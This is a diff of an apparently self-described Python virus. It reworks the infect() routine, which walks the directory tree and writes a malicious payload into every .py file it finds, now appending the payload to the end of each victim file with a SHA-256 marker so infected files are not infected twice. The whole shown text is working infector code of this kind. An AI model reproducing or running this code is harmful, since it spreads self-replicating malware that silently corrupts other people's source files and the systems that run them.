@@ -92,31 +92,33 @@ def infect(troy):
 	"""
 		Infects all the python scripts in current and all subdirectories recursively
 		with the prepared malicious code. It first calculates a hash value of malicious code +
-		file's current content and injects both. In order not to inject an already infected
-		file again, it first checks if a file infected by checking its first line.
-		If first line includes a hash in this virus's format then it checks if this hash
-		matches the current hash. If file does not include a hash then it gets infected by the virus
-		or if the file includes a hash but its hash does not match (file may have been changed later)
-		it overwrites the old virus injection and reinjects malicious code with the newly calculated hash value.
+		file's current content and injects both to the end of the victim.
+
+		In order not to inject an already infected file again, it first checks if a file infected
+		by checking its last line. If last line includes a hash in this virus's format (#*!@hash)
+		then it checks if this hash matches the file's current hash. If file does not include a hash
+		then it gets infected by the virus or if the file includes a hash but its hash does not match
+		(file may have been changed later) it overwrites the old virus injection and reinjects malicious
+		code with the newly calculated hash value.
 	"""
-	for root, _, files in os.walk('..'):
+	for root, _, files in os.walk('.'):
 		for file in files:
 			relative_path = root + '/' + file
 			if file.endswith(".py") and relative_path != "./virus.py":
 				with open(relative_path, 'r') as original:
-					first_line = original.readline()
-					data = original.read()
-					if first_line.startswith("#!*@"):
-						if check_if_infected(first_line[4:].rstrip('\n'), data):
+					data = original.read().split('\n')
+					last_line = data[-1]
+					if last_line.startswith("#*!@"):
+						if check_if_infected(last_line[4:].rstrip('\n'), '\n'.join(data[:-1])):
 							continue
 						else:
-							data = '\n'.join(data.split('\n')[1:])
+							data = '\n'.join(data[:-2])
 					else:
-						data = first_line + data
+						data = '\n'.join(data)
 				with open(relative_path, 'w') as modified:
-					new_content = "{0}\n{1}".format(troy, data)
+					new_content = "{0}\n{1}".format(data, troy)
 					content_hash = hashlib.sha256(new_content.encode())
-					modified.write("#!*@{0}\n{1}".format(content_hash.hexdigest(), new_content))
+					modified.write("{0}\n#*!@{1}".format(new_content, content_hash.hexdigest()))
 
 
 def virus_routine():
